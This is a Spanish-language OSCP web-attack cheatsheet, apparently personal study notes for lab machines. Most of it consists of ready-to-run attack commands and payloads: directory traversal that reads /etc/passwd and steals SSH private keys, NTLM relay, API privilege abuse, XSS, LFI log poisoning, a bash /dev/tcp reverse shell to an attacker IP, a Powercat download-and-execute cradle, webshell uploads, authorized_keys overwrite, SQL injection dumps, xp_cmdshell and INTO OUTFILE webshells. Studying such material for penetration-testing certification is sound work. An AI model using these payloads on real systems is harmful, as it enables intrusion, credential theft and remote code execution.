---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Web

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Fingerprinting del servidor / stack
```bash
sudo nmap -p80 -sV 192.168.50.20                    # versión del servidor web
sudo nmap -p80 --script=http-enum 192.168.50.20     # fingerprint: dirs/ficheros típicos
curl -i https://target/                             # ver headers (Server, X-Powered-By...)
curl https://target/robots.txt                      # directivas Allow/Disallow (páginas sensibles)
whatweb http://target                                # fingerprint rápido de tecnologías (CMS, servidor, JS)
```
Wappalyzer (online, pasivo): revela SO, framework UI, servidor, CDN y librerías JS (anotar versiones para CVEs).

## Directory / file brute force (Gobuster)
```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```
`dir` modo dirs/ficheros · `-u` URL · `-w` wordlist · `-t` threads (defecto 10). Status: 301 dir, 403 existe sin acceso, 302 redirect, 200 ok.

## WordPress (WPScan) — ver [[WordPress Duplicator - Directory Traversal (CVE-2020-11738)]]
```bash
wpscan --url http://target --enumerate p --plugins-detection aggressive   # enumerar plugins (sin API key)
wpscan --url http://target --enumerate u                                  # enumerar usuarios
```
`--plugins-detection aggressive` prueba rutas de plugins conocidos aunque no se detecten pasivamente (más lento, más completo). Revisar cada plugin/versión encontrado contra CVEs conocidas (`searchsploit <plugin> wordpress`).

### Duplicator — directory traversal no autenticado (CVE-2020-11738)
```bash
curl "http://target/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../etc/passwd"
curl "http://target/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../home/USER/.ssh/id_rsa" -o id_rsa
```

### Backup Migration — forzar relay NTLM vía "Backup directory path"
```text
# En la config del plugin, campo "Backup directory path":
//<IP_kali>/test
```
Al guardar, el plugin se autentica por SMB contra Kali → relayar con `impacket-ntlmrelayx` hacia un segundo host con SMB signing deshabilitado (ver [[NTLM Relay Forzado desde una Aplicacion Web (ntlmrelayx)]]).
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP_destino> -c "powershell -enc <b64>"
```

## API REST (enumeración y abuso) — ver [[API Enumeration]]
```bash
# pattern:  {GOBUSTER}/v1  /  {GOBUSTER}/v2
gobuster dir -u http://target:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
gobuster dir -u http://target:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
curl -i http://target:5002/users/v1                                   # GET (405=existe, otro método)
curl -d '{"password":"x","username":"admin"}' -H 'Content-Type: application/json' http://target:5002/users/v1/login
curl -d '{"password":"lab","username":"u","email":"a@a.com","admin":"True"}' \
     -H 'Content-Type: application/json' http://target:5002/users/v1/register   # parámetro oculto admin
curl -X 'PUT' http://target:5002/users/v1/admin/password \
     -H 'Content-Type: application/json' -H 'Authorization: OAuth <JWT>' -d '{"password":"pwned"}'
```

## Burp Suite
```bash
burpsuite                                            # lanzar (o menú Applications > 03 Web App Analysis)
```
- Proxy listener por defecto `127.0.0.1:8080`; Firefox: Manual proxy, todos los protocolos.
- Intercept OFF para navegar · **Send to Repeater** (modificar/reenviar) · **Send to Intruder** (fuzzing).
- Quitar captive portal: `about:config` → `network.captive-portal-service.enabled` = false.
- `/etc/hosts`: `192.168.50.16 offsecwp` (resolver hostname sin DNS).

## XSS — ver [[Cross-Site Scripting (XSS)]]
```
# caracteres de prueba
< > ' " { } ;
```
```html
<script>alert(42)</script>                          <!-- PoC básico -->
```
```bash
# stored XSS por User-Agent (inyectar y disparar la página que lo pinta)
curl -i http://offsecwp --user-agent "<script>alert(42)</script>" --proxy 127.0.0.1:8080
```
```bash
cat /usr/share/wordlists/rockyou.txt | head         # primeras 10 (payloads Intruder)
```

## Directory Traversal — ver [[Directory Traversal]]
```bash
curl "http://target/index.php?page=../../../../../../../../../etc/passwd"          # Linux
curl "http://target/index.php?page=../../../../../../../home/USER/.ssh/id_rsa"     # robar clave SSH
# Windows: probar / y \
../../../Windows/System32/drivers/etc/hosts   |   ..\..\..\Windows\System32\drivers\etc\hosts
# bypass de filtro con URL encoding (.=%2e) — CVE-2021-41773 Apache 2.4.49
curl "http://target/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
chmod 400 dt_key && ssh -i dt_key -p 2222 user@target                             # usar la clave robada
```

## LFI / RFI + PHP wrappers — ver [[File Inclusion (LFI-RFI)]]
```bash
# LFI: log poisoning -> UA con <?php echo system($_GET['cmd']); ?>, luego incluir el log
page=../../../../../../var/log/apache2/access.log&cmd=ls        # (Windows XAMPP: C:\xampp\apache\logs\)
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"          # revshell (envolver en bash -c), URL-encoded
# php://filter -> leer source en base64
curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=admin.php"
# data:// -> ejecutar PHP (requiere allow_url_include=On)
curl "http://target/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
# RFI -> incluir webshell remota
python3 -m http.server 80                                       # en /usr/share/webshells/php/
curl "http://target/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

## File Upload — ver [[File Upload]]
```bash
# bypass de blacklist de extensión: .pHP, .php7, .phps, .phtml, o renombrar
curl "http://target/uploads/simple-backdoor.pHP?cmd=whoami"     # ejecutar webshell subida
ls /usr/share/webshells/                                        # asp aspx cfm jsp perl php laudanum
# upload + traversal: sobrescribir authorized_keys de root (cambiar filename en Burp)
ssh-keygen; cat fileup.pub > authorized_keys                    # filename: ../../../../../root/.ssh/authorized_keys
ssh -p 2222 -i fileup root@target
```

## Command Injection — ver [[Command Injection]]
```bash
curl -X POST --data 'Archive=git%3Bipconfig' http://target:8000/archive   # %3B=; %26%26=&& %26=& (CMD)
# Windows revshell con Powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80 ; nc -nvlp 4444
# inyectar: IEX(New-Object Net.Webclient).DownloadString("http://IP/powercat.ps1");powercat -c IP -p 4444 -e powershell
```

## SQL Injection — ver [[SQL Injection]]
```sql
-- confirmar: meter ' en el input -> error SQL. Comentario de cierre: "-- " (con espacio); aquí "-- //"
offsec' OR 1=1 -- //                                         -- bypass de autenticación
' or 1=1 in (SELECT password FROM users WHERE username='admin') -- //   -- error-based (1 columna)
-- UNION-based
' ORDER BY 1-- //                                           -- subir N hasta fallar = nº de columnas
%' UNION SELECT 'a1','a2','a3','a4','a5' -- //              -- ver columnas que se pintan
' UNION SELECT null,null,database(),user(),@@version -- //  -- enumerar
' union select null,table_name,column_name,table_schema,null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null,username,password,description,null FROM users -- //  -- dump
-- blind
user=offsec' AND 1=1 -- //                                  -- boolean (comparar con AND 1=2)
user=offsec' AND IF (1=1, sleep(3),'false') -- //           -- time-based
```
```bash
# conectar a instancias
mysql -u root -p'root' -h target -P 3306 --skip-ssl-verify-server-cert   # (o --skip-ssl si TLS error)
impacket-mssqlclient Administrator:Lab123@target -windows-auth           # MSSQL vía TDS (NTLM)
```
```sql
-- MSSQL RCE: xp_cmdshell (deshabilitado por defecto)
EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
-- MySQL RCE: webshell con INTO OUTFILE (ruta escribible)
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

## sqlmap — ver [[SQLMap]]
```bash
sqlmap -u http://target/blindsqli.php?user=1 -p user            # detectar
sqlmap -u http://target/blindsqli.php?user=1 -p user --dump     # volcar la BD actual
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"   # shell (POST de Burp, mejor UNION)
```
</content>
